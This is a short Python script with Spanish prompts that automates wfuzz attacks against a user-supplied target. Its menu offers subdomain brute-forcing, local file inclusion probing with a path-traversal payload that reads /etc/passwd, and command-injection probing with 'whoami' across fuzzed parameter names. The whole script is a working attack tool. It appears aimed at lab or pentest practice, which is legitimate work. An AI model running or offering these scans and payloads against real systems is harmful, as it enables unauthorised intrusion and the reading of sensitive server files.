import subprocess as sp

print("""
[+] Herramienta WFuzz Automática
""")

try:
    opcion = int(input("""
Digite una opcion

[1] Escaneo de subdominios
[2] Busqueda de vulnerabilidad LFI
[3] Busqueda de vulnerabilidad RCE
[4] Salir

> """))
except:
    print("Error")
    exit()

if opcion == 1:
    try:
        dominio = input("Digite el dominio objetivo (ej: site.com): ").strip()
        comando = [
            "wfuzz",
            "-c",
            "-w", "/usr/share/seclists/Discovery/DNS/subdomains-top1million-110000.txt",
            "--hc", "404",
            f"http://FUZZ.{dominio}/"
        ]
        sp.run(comando)
    except Exception as e:
        print("Error:", e)
        exit()

elif opcion == 2:
    try:
        url = input("URL base (ej: http://172.17.0.2/index.php): ").strip()
        comando = [
            "wfuzz",
            "-c",
            "-w", "/usr/share/seclists/Discovery/Web-Content/burp-parameter-names.txt",
            "--hl=62",
            f"{url}?FUZZ=../../../../../../../../../../../../../etc/passwd"
        ]
        sp.run(comando)
    except Exception as e:
        print("Error:", e)
        exit()

elif opcion == 3:
    try:
        url = input("Digite la URL objetivo (ej: http://site.com): ").strip()
        comando = [
            "wfuzz",
            "-c",
            "--hl", "62",
            "-w", "/usr/share/seclists/Discovery/Web-Content/burp-parameter-names.txt",
            f"{url}?FUZZ=whoami"
        ]
        sp.run(comando)
    except Exception as e:
        print("Error:", e)
        exit()

elif opcion == 4:
    print("Adios...")
    exit()

else:
    print("Opción no válida")
    exit()
